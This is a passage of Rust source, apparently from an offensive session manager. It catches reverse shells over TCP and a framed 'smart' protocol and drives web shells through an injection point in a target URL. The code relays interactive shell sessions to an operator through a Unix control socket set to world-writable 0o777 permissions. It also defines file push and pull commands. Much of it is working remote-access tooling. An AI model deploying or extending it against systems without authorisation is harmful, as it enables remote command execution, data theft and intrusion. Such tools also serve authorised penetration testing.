        std::thread::spawn(move || {
            let rt = tokio::runtime::Builder::new_current_thread().enable_time().build().unwrap();
            rt.block_on(async move {
                loop {
                    if d1.load(Ordering::SeqCst) || !a2.load(Ordering::SeqCst) || p1.load(Ordering::SeqCst) { break; }
                    let mut b = b2.lock().await;
                    if !b.is_empty() {
                        let data = b.clone(); b.clear(); drop(b);
                        if s2.write_all(&data).is_err() { p1.store(true, Ordering::SeqCst); break; }
                    } else { drop(b); tokio::time::sleep(Duration::from_millis(50)).await; }
                }
            });
        });

        // Thread: read from control socket → smart writer (SHELL frames)
        let ws = Arc::clone(&writer);
        let d2 = Arc::clone(&done);
        let p2 = Arc::clone(&pc);
        let mut s3 = stream.try_clone()?;
        std::thread::spawn(move || {
            let rt = tokio::runtime::Builder::new_current_thread().enable_time().build().unwrap();
            let _ = rt.block_on(async move {
                let mut buf2 = [0u8; 65536];
                let _ = s3.set_read_timeout(Some(Duration::from_secs(1)));
                loop {
                    if d2.load(Ordering::SeqCst) || p2.load(Ordering::SeqCst) { break; }
                    match s3.read(&mut buf2) {
                        Ok(0) => { p2.store(true, Ordering::SeqCst); break; }
                        Ok(n) => {
                            let data = buf2[..n].to_vec();
                            let mut w = ws.lock().await;
                            let _ = write_frame(&mut *w, protocol::FRAME_SHELL, &data).await;
                        }
                        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock || e.kind() == std::io::ErrorKind::TimedOut => continue,
                        Err(_) => { p2.store(true, Ordering::SeqCst); break; }
                    }
                }
                Ok::<_, anyhow::Error>(())
            });
        });

        loop { tokio::time::sleep(Duration::from_millis(200)).await; if !alive.load(Ordering::SeqCst) || pc.load(Ordering::SeqCst) { break; } }
        done.store(true, Ordering::SeqCst);
        return Ok(());
    }

    // TCP
    if let Some((sw, sb, alive)) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Tcp(s, b)) => Some((Arc::clone(&s.writer), Arc::clone(b), Arc::clone(&s.alive))), _ => None } } {
        r!(serde_json::json!({"status":"ok","message":"Entering interactive mode"}));
        stream.write_all(b"\r\n[+] Interactive mode. Press Ctrl+C to detach\r\n")?;
        let mut s2 = stream.try_clone()?;
        let done = Arc::new(AtomicBool::new(false));
        let pc = Arc::new(AtomicBool::new(false));
        let b2 = Arc::clone(&sb);
        let a2 = Arc::clone(&alive);
        let d1 = Arc::clone(&done);
        let p1 = Arc::clone(&pc);
        std::thread::spawn(move || {
            let rt = tokio::runtime::Builder::new_current_thread().enable_time().build().unwrap();
            rt.block_on(async move {
                loop {
                    if d1.load(Ordering::SeqCst) || !a2.load(Ordering::SeqCst) || p1.load(Ordering::SeqCst) { break; }
                    let mut b = b2.lock().await;
                    if !b.is_empty() {
                        let data = b.clone(); b.clear(); drop(b);
                        if s2.write_all(&data).is_err() { p1.store(true, Ordering::SeqCst); break; }
                    } else { drop(b); tokio::time::sleep(Duration::from_millis(50)).await; }
                }
            });
        });
        let ws = Arc::clone(&sw);
        let d2 = Arc::clone(&done);
        let p2 = Arc::clone(&pc);
        let mut s3 = stream.try_clone()?;
        std::thread::spawn(move || {
            let rt = tokio::runtime::Builder::new_current_thread().enable_time().build().unwrap();
            let _ = rt.block_on(async move {
                let mut buf2 = [0u8; 65536];
                let _ = s3.set_read_timeout(Some(Duration::from_secs(1)));
                loop {
                    if d2.load(Ordering::SeqCst) || p2.load(Ordering::SeqCst) { break; }
                    match s3.read(&mut buf2) {
                        Ok(0) => { p2.store(true, Ordering::SeqCst); break; }
                        Ok(n) => { let d = buf2[..n].to_vec(); let mut w = ws.lock().await; let _ = w.write_all(&d).await; }
                        Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock || e.kind() == std::io::ErrorKind::TimedOut => continue,
                        Err(_) => { p2.store(true, Ordering::SeqCst); break; }
                    }
                }
                Ok::<_, anyhow::Error>(())
            });
        });
        loop { tokio::time::sleep(Duration::from_millis(200)).await; if !alive.load(Ordering::SeqCst) || pc.load(Ordering::SeqCst) { break; } }
        done.store(true, Ordering::SeqCst);
        return Ok(());
    }

    // Web
    #[cfg(feature = "web")]
    if let Some((config, _buf)) = { let mg = manager.lock().await; match mg.sessions.get(&id) { Some(ManagedSession::Web(s)) => Some((wirewrench::WebShellConfig { url: s.url.clone(), injection_point: s.injection_point.clone(), method: s.method.clone(), body_template: s.body_template.clone(), headers: s.headers.clone(), cookie: s.cookie.clone() }, Arc::clone(&s.buf))), _ => None } } {
        use std::io::Read;
        r!(serde_json::json!({"status":"ok","message":"Entering web shell interactive mode"}));
        stream.write_all(b"\r\n[+] Web shell interactive mode (Ctrl+C to detach)\r\n>> ")?; stream.flush()?;
        stream.set_read_timeout(Some(Duration::from_millis(100)))?;
        'outer: loop {
            let mut cb = Vec::new(); let mut tmp = [0u8; 65536];
            'rl: loop {
                match stream.read(&mut tmp) {
                    Ok(0) => break 'outer, Ok(n) => { for &b in &tmp[..n] { if b == 0x03 { break 'outer; } if b == b'\n' { break 'rl; } cb.push(b); } }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock || e.kind() == std::io::ErrorKind::TimedOut => continue,
                    Err(_) => break 'outer,
                }
            }
            let cmd = String::from_utf8_lossy(&cb).trim().to_string(); if cmd.is_empty() { continue; }
            match web_shell_exec(&config, &cmd).await {
                Ok(body) => { stream.write_all(body.replace("\n", "\r\n").as_bytes())?; stream.write_all(b"\r\n>> ")?; stream.flush()?; }
                Err(e) => { let m = format!("\r\n[!] {}\r\n", e); stream.write_all(m.as_bytes())?; stream.flush()?; }
            }
        }
        return Ok(());
    }

    respond!(Response::error("Shell not found"));
    Ok(())
}

// ── Helper types + respond helpers ──────────────────────────────────────────

#[derive(serde::Deserialize)]
struct PushCommand { path: String, size: u64, #[serde(default = "def_timeout")] timeout: f64 }

#[derive(serde::Deserialize)]
struct PullCommand { path: String, #[serde(default = "def_timeout")] timeout: f64 }

fn def_timeout() -> f64 { 30.0 }

async fn respond_ok(stream: &mut std::os::unix::net::UnixStream, msg: impl Into<String>) {
    let j = serde_json::to_string(&Response::with_output(msg.into())).unwrap_or_default() + "\n";
    let _ = stream.write_all(j.as_bytes());
}

async fn respond_error(stream: &mut std::os::unix::net::UnixStream, msg: impl Into<String>) {
    let j = serde_json::to_string(&Response::error(msg.into())).unwrap_or_default() + "\n";
    let _ = stream.write_all(j.as_bytes());
}

// ── Control server ─────────────────────────────────────────────────────────

async fn control_server(manager: Arc<Mutex<SessionManager>>, socket_path: &str) -> Result<()> {
    let _ = std::fs::remove_file(socket_path);
    let listener = UnixListener::bind(socket_path)
        .with_context(|| format!("Failed to bind Unix socket at {}", socket_path))?;
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(socket_path, std::fs::Permissions::from_mode(0o777))?;
    eprintln!("[+] Control socket at {}", socket_path);

    loop {
        match listener.accept().await {
            Ok((stream, _)) => {
                let mgr = Arc::clone(&manager);
                tokio::spawn(async move {
                    if let Err(e) = handle_control(stream, mgr).await {
                        eprintln!("[-] Control handler error: {}", e);
                    }
                });
            }
            Err(e) => eprintln!("[-] Control accept error: {}", e),
        }
    }
}

// ── Main ────────────────────────────────────────────────────────────────────

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    let args = Args::parse();
    let manager = Arc::new(Mutex::new(SessionManager::new()));

    let mgr1 = Arc::clone(&manager);
    let host1 = args.host.clone();
    tokio::spawn(async move {
        if let Err(e) = tcp_listener(mgr1, &host1, args.port).await {
            eprintln!("[-] TCP listener error: {}", e);
        }
    });

    let mgr2 = Arc::clone(&manager);
    let host2 = args.host.clone();
    tokio::spawn(async move {
        if let Err(e) = smart_listener(mgr2, &host2, args.smart_port).await {
            eprintln!("[-] Smart listener error: {}", e);
        }
    });

    let sock = args.socket.clone();
    control_server(manager, &sock).await
}
